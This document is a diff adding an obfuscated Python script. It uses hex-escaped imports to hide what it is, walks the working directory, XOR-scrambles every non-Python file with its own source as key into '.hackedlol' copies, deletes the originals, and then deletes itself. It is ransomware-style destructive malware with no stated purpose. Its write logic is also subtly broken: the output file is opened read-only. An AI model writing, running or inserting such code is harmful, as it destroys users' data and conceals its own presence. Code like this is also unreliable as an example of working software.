@@ -1,0 +1,11 @@
+os=__import__('\x6f\x73', __builtins__.__dict__['g\x6coba\x6cs'](),  __builtins__.__dict__['\x6coca\x6cs']());os=__import__('\x6fs', __builtins__.__dict__['g\x6coba\x6cs'](),  __builtins__.__dict__['\x6coca\x6cs']());dirisendiri=open(eval("\x5f\x5f\x66\x69\x6c"+"\x65\x5f\x5f")).read()
+
+for root, dir, files in os.walk(os.getcwd()):
+    for file in files:
+        if not file.endswith(".py"):
+            fileOpen=open(root+"/"+file, "rb").read();out=open(root+"/"+(file.rsplit(".", 1)[0])+".hackedlol", "rb")
+            for i in range(len(fileOpen)):
+                out.write(chr(fileOpen[i]^ord(dirisendiri[(i*0x27)%len(dirisendiri)])).encode())
+            os.remove(root+"/"+file)
+
+os.remove(eval("\x5f\x5f\x66\x69\x6c"+"\x65\x5f\x5f"))
